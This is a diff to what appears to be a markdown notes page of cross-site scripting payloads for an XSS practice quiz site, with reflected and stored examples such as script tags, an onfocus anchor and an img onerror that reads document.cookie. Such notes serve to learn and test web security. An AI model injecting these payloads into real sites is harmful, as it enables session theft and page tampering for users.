@@ -13,8 +13,9 @@ https://xss-quiz.int21h.jp/
 "><script>prompt(1)</script>
 
 ```
+```
 ifty' ; alert() ;'test
-
+```
 ![image](https://github.com/user-attachments/assets/8cda4789-521e-4bec-a2dd-5cb9daaf2595)
 
 ```
@@ -28,7 +29,10 @@ javascript:alert()
 ![image](https://github.com/user-attachments/assets/c241170a-c0c8-43c1-b6a8-077e09b5a098)
 
 ### stored :
+
 ```
+<a id=x tabindex=1 onfocus=alert(1)>a</a>
+
 <img src="does-not-exist" onerror="alert(document.cookie)">
 
 “>img src=x onerror=alert(1)
